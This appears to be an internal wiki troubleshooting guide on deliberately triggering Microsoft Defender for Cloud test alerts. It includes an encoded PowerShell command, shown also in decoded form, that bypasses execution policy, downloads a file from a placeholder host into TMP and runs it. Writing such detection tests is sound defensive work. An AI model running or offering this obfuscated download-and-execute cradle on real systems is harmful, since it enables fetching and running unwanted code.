---
source: ado-wiki
sourceRef: "ASIM-Security/Infrastructure Solutions/Defender for Cloud:/Defender for Cloud/Security Alerts/[Troubleshooting Guide] - Testing Alerts/[TSG] - Manually Trigger Alerts"
sourceUrl: "https://dev.azure.com/ASIM-Security/Infrastructure%20Solutions/_wiki/wikis/Defender%20for%20Cloud?pagePath=/Defender%20for%20Cloud/Security%20Alerts/%5BTroubleshooting%20Guide%5D%20-%20Testing%20Alerts/%5BTSG%5D%20-%20Manually%20Trigger%20Alerts"
importDate: "2026-04-06"
type: troubleshooting-guide
---

## Overview
How to manually trigger various types of security alerts in Microsoft Defender for Cloud for testing and validation.

## Manual Trigger Methods

### Clear Security Log
When you clear the Security Events for an onboarded device you will receive an **informational** alert.

**Note:** Informational alerts are not displayed on the Alerts dashboard by default - you must filter to include informational severity.

### Suspicious PowerShell Activity Detected

Run an encoded PowerShell command to trigger a **High severity** alert:

```powershell
powershell.exe -enc UG93ZXJTaGVsbCAtRXhlY3V0aW9uUG9saWN5IGJ5cGFzcyAtbm9wcm9maWxlIC1jb21tYW5kIChOZXctT2JqZWN0IFN5c3RlbS5OZXQuV2ViQ2xpZW50KS5Eb3dubG9hZEZpbGUoImh0dHA6Ly84LjguOC44L25vZmlsZSIsICIkZW52OlRNUFxpc25vdGFiYWRmaWxlLmV4ZSIgKTsgU3RhcnQtUHJvY2VzcygiJGVudjpUTVBcaXNub3RhYmFkZmlsZS5leGUiKQ==
```

Decoded command:
```powershell
PowerShell -ExecutionPolicy bypass -noprofile -command (New-Object System.Net.WebClient).DownloadFile("http://8.8.8.8/nofile", "$env:TMP\isnotabadfile.exe" ); Start-Process("$env:TMP\isnotabadfile.exe")
```

### RDP Brute Force
*(In Progress)*

### Basic Auth on IIS
*(In Progress)*

### SQL Injection
*(In Progress)*

### Suspicious Process Executed
Similar to the EICAR test:

1. Copy an executable (e.g. notepad.exe) into a file named `genhash.exe`
2. Execute the program (note that it might not load)
3. After a few minutes, you will receive a **HIGH severity** alert "Suspicious process executed"

## External References

- [Azure Security Center Playbook: Security Alerts](https://gallery.technet.microsoft.com/Azure-Security-Center-f621a046)
- [Azure Security Center Playbook: Linux Detections](https://gallery.technet.microsoft.com/Azure-Security-Center-0ac8a5ef)
- [Complete list of Azure Security Center Alerts](https://docs.microsoft.com/en-us/azure/security-center/alerts-reference)
- [Alert Validation (EICAR)](https://docs.microsoft.com/en-us/azure/security-center/security-center-alert-validation)
